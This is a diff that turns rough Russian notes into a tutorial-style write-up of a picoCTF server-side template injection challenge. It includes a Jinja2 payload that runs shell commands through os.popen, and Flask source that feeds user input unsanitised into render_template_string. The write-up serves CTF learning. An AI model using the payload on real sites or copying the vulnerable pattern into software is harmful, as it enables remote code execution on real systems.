@@ -1,4 +1,63 @@
-SSTI - уязвимость, нацеленная на шаблонизаторы динамической генерации контекта. Сейчас шаблонизаторы не используются в рендеринге веб-страниц (рендеринг происходит на стороне клиента), но их можно найти в создании почтовых рассылок и конфигурационных файлов. <нужно описание кода>
-К примеру, на picoCTF приведен элементарная SSTI уязвимость: https://play.picoctf.org/practice/challenge/492?category=1&page=1
-В задании представлен вебсайт с окном ввода: с помощью вкладки Network в консоли разработчика видно, что веб-приложение использует Python: <фото>
-Классическая эксплуатация SSTI в Python использует следующий шелл: {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}, что выдаст список файлов в текущей директории. Среди них находится флаг для сдачи задания, но нас интересует сам код: cat app.py
+# Server-Side Template Injection (SSTI)
+
+SSTI - уязвимость, нацеленная на шаблонизаторы динамической генерации контекста. В настоящее время шаблонизаторы редко используются в рендеринге веб-страниц (так как рендеринг обычно происходит на стороне клиента), но их можно встретить в системах создания почтовых рассылок и генерации конфигурационных файлов.
+
+## Пример уязвимости SSTI (picoCTF)
+
+Рассмотрим элементарный пример SSTI уязвимости с [picoCTF](https://play.picoctf.org/practice/challenge/492?category=1&page=1).
+
+### Описание уязвимости
+
+В задании представлен веб-сайт с окном ввода. С помощью вкладки Network в консоли разработчика можно определить, что веб-приложение использует Python.
+
+![Screenshot of Network tab showing Python backend](ссылка_на_фото_если_есть)
+
+### Эксплуатация уязвимости
+
+Классическая эксплуатация SSTI в Python использует следующий payload:
+```
+{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
+```
+
+Этот код выведет список файлов в текущей директории. Среди них находится файл с флагом для сдачи задания. Для просмотра исходного кода приложения можно использовать:
+```
+cat app.py
+```
+
+### Исходный код уязвимого приложения
+
+```python
+from flask import Flask, render_template_string, request, redirect
+
+app = Flask(__name__)
+
+@app.route('/', methods = ['GET', 'POST'])
+def home():
+    if request.method == 'POST':
+        return redirect('/announce', code=307)
+    else:
+        return render_template_string("""
+            <!doctype html>
+            <title>SSTI1</title>
+            <h1> Home </h1>
+            <p> I built a cool website that lets you announce whatever you want!* </p>
+            <form action="/" method="POST">
+                What do you want to announce: <input name="content" id="announce">
+                <button type="submit"> Ok </button>
+            </form>
+            <p style="font-size:10px;position:fixed;bottom:10px;left:10px;">
+                *Announcements may only reach yourself
+            </p>
+            """)
+
+@app.route("/announce", methods = ["POST"])
+def announcement():
+    return render_template_string("""
+        <!doctype html>
+        <h1 style="font-size:100px;" align="center">""" + request.form.get("content", "") + """</h1>
+        """, )
+```
+
+### Анализ уязвимости
+
+Уязвимость находится в функции `announcement()`, где пользовательский ввод (`request.form.get("content", "")`) напрямую передается в `render_template_string()` без какой-либо санитизации. Это позволяет злоумышленнику внедрять произвольные шаблонные выражения.
